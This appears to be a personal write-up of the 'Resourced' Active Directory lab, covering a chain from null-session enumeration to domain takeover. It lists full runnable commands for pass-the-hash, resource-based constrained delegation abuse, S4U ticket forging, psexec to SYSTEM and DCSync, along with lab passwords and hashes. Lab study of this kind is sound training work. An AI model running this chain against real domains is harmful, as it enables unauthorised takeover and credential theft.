title: Resourced Retrospective — Reading the RBCD-on-DC Path
body:
Resourced was a null-session-to-Domain-Admin AD chain with two traps that teach recognition more than technique: a password hidden in plain sight, and a decoy that looks like game-over but isn't. The real win comes from reading one BloodHound edge correctly.

Chain: null-session SMB user enum → password in a user DESCRIPTION field → authenticated share access → STALE ntds.dit backup (the decoy) → one live hash reused → evil-winrm foothold → BloodHound: GenericAll over the DC computer object → RBCD → S4U → DCSync → Domain Admin.

— SIX LESSONS —

  1. THE DESCRIPTION FIELD IS A CREDENTIAL STORE
     nxc --users / enum4linux dumped every account WITH descriptions. One read:
     'New-hired, reminder: HotelCalifornia194!'. That was V.Ventz's password,
     sitting in AD, readable over a NULL SESSION before you own anything.
     ALWAYS read the description field on user enum — lab authors park creds,
     password-reminder notes, and 'temporary' passwords there constantly.
       rpcclient -U '%' $dc -c querydispinfo  # canonical: Desc: field per user
       nxc smb $dc -u '' -p '' --users        # descriptions column
       enum4linux-ng -A -u '' -p '' $dc        # 'description:' lines

  2. NULL SESSION IS FREE RECON — ALWAYS TRY -u '' -p ''
     (Null Auth: True) meant users, groups, and the password policy came out
     with NO credentials. That single anonymous bind handed over the whole
     user list AND the description-field password. Try null/guest FIRST on any
     445/389 target — it costs one command and often is the foothold.

  3. THE STALE ntds.dit DECOY — RECOGNIZE A DEAD BACKUP
     The 'Password Audit' share (readable as V.Ventz) held ntds.dit + the
     registry hives. secretsdump cracked it open — feels like instant win.
     It is NOT. That backup was from 2021: EVERY hash from it failed to auth
     (PASSWORD_EXPIRED / LOGON_FAILURE) EXCEPT L.Livingstone, the sysadmin
     whose password had never rotated. The offline Administrator hash
     (12579b1...) was DEAD; the live one (8e0efd0...) came later via DCSync.
     RECOGNITION RULE: after dumping ANY offline/backup ntds.dit, validate
     each hash against live auth (nxc -u users -H hashes --no-bruteforce).
     The ones that survive are your real foothold — don't assume the
     Administrator line is usable just because you dumped it.

  4. GENERICALL OVER THE **DC** = RBCD → DCSYNC (the key read)
     BloodHound showed: L.Livingstone --GenericAll--> RESOURCEDC (a COMPUTER,
     and it's the DC) ; RESOURCEDC --DCSync--> the domain. The trap here is
     misreading it: L.Livingstone can't DCSync directly — the DC's machine
     account can. Your GenericAll over the DC computer object is the lever.
     Control a computer object → write its msDS-AllowedToActOnBehalfOf →
     S4U a cifs/ ticket as Administrator → then psexec -k straight to
     nt authority\system ON THE DC = domain owned. The cifs/ ticket is the
     universal cash-in (psexec works on a member server too); what the DC
     changes is IMPACT, not the tool. DCSync is an OPTIONAL bonus here —
     since you're impersonating Administrator you can also pull krbtgt +
     every hash for persistence, but you don't need it for the proof.
     (What we did in-session: DCSync → grab the live admin hash →
     evil-winrm -H. The official path: psexec -k → SYSTEM directly. Both
     valid.) The edge target being a COMPUTER — and it being the DC — is
     the whole tell.

  5. THE ccache FILENAME MUST MATCH EXACTLY
     getST saved Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL
     .ccache. First DCSync attempt exported a filename missing the
     @RESOURCED.LOCAL part — secretsdump printed only 'Cleaning up...' and NO
     hashes. That's not an error message; it's the wrong (empty) ticket.
     ls *.ccache and copy the name verbatim into KRB5CCNAME. Silent failure.

  6. TWO NTDS DUMPS, ONE AUTHORITATIVE
     You dumped the directory TWICE: once offline from the stale backup, once
     live via DCSync. Same usernames, DIFFERENT Administrator/krbtgt hashes.
     The LIVE DCSync is authoritative — it reflects current passwords. When
     two dumps disagree, the one pulled from the running DC wins; the backup
     is a historical snapshot and its high-value hashes are usually rotated.

— REUSABLE CHAIN (null-session AD, computer-object ACL) —

  1. nxc smb $dc -u '' -p '' --users      → grab users + descriptions
  2. mine descriptions for creds/hints → validate with nxc
  3. authed --shares → read any non-default share (backups, audits)
  4. if you find a backup ntds.dit: dump it, but VALIDATE every hash live
  5. foothold with whatever still authenticates → evil-winrm
  6. BloodHound → Mark Owned → Shortest Path from Owned
  7. ACL edge over a COMPUTER? → RBCD → S4U cifs/ ticket → psexec -k = SYSTEM.
     Computer == DC → SYSTEM there = domain owned (+ optional DCSync for krbtgt).
  Trophy (live): Administrator NT 8e0efd059433841f73d171c69afdda7c ; krbtgt
  7ddb984fb68a47040c0931038a0ba0b4 (golden-ticket material).
cmd:
# ── RESOURCED PATTERN — null session → DA via RBCD-on-DC ──

# 1) NULL-SESSION ENUM — users + the description-field password
rpcclient -U '%' $dc -c querydispinfo   # canonical anon enum — Desc: per account
nxc smb $dc -u '' -p '' --users        # read the DESCRIPTION column
enum4linux-ng -A -u '' -p '' $dc        # 'description:' lines, policy, groups
#   → V.Ventz : HotelCalifornia194!  (lived in the description field)

# 2) VALIDATE the found cred
nxc smb $dc -u 'V.Ventz' -p 'HotelCalifornia194!'
nxc smb $dc -u 'V.Ventz' -p 'HotelCalifornia194!' --shares   # find 'Password Audit'

# 3) THE DECOY — stale ntds.dit on the readable share
smbclient //$dc/'Password Audit' -U 'domain/V.Ventz%HotelCalifornia194!'
#   pull Active Directory/ntds.dit + registry/SYSTEM,SECURITY
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > dump.txt

# 4) VALIDATE EVERY DUMPED HASH LIVE — don't trust the backup Administrator
grep ':::' dump.txt | grep -v '\$' | cut -d: -f1 > users.txt
grep ':::' dump.txt | grep -v '\$' | cut -d: -f4 > nt.txt
nxc smb $dc -u users.txt -H nt.txt --no-bruteforce --continue-on-success
#   → only L.Livingstone survives (others PASSWORD_EXPIRED). THAT'S the foothold.

# 5) FOOTHOLD
evil-winrm -i $dc -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

# 6) BLOODHOUND → GenericAll over RESOURCEDC (the DC computer object)
#    Recognition: edge target is a COMPUTER, and it's the DC → RBCD → DCSync

# 7) RBCD → S4U → DCSYNC  (full flow + gotchas in the delegation node)
impacket-addcomputer domain/l.livingstone -dc-ip $dc -hashes :<livingstone-NT> -computer-name 'FAKE01$' -computer-pass 'FakePass123!'
impacket-rbcd domain/l.livingstone -dc-ip $dc -hashes :<livingstone-NT> -action write -delegate-to 'RESOURCEDC$' -delegate-from 'FAKE01$'
impacket-getST domain/'FAKE01$':'FakePass123!' -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip $dc
sudo sh -c 'echo "$dc resourcedc.resourced.local" >> /etc/hosts'   # FQDN for Kerberos
export KRB5CCNAME='Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache'   # ls *.ccache — EXACT
impacket-psexec -k -no-pass resourcedc.resourced.local   # → nt authority\system (proof.txt)
#   OPTIONAL bonus (it's the DC): pull every hash + krbtgt for persistence
impacket-secretsdump -k -no-pass resourcedc.resourced.local -just-dc
#   → live Administrator 8e0efd0... / krbtgt 7ddb984... (golden-ticket material)
warn: Resourced's whole difficulty is recognition, not technique. Two traps: (1) the password reminder in the description field — miss it and you're stuck at the null session; (2) the stale ntds.dit — crack it and it FEELS like you won, but every high-value hash is dead except one unrotated sysadmin. If you assume the backup's Administrator hash works, you'll burn time PtH-ing a dead credential. ALWAYS validate dumped hashes against live auth. The actual path is the GenericAll edge over the DC computer object → RBCD → DCSync; the offline dump is a detour that only hands you the one live foothold hash. And the ccache filename mismatch fails SILENTLY — 'Cleaning up...' with no hashes means wrong KRB5CCNAME, not 'no rights'.

choices.label: Apply it: computer-object ACL edge → delegation/RBCD
Recognize the vector from a BloodHound finding
Abuse the ACL edge (GenericAll/Write on any object)
RBCD ticket — psexec to SYSTEM on the DC
RBCD landed on the DC — DCSync the domain
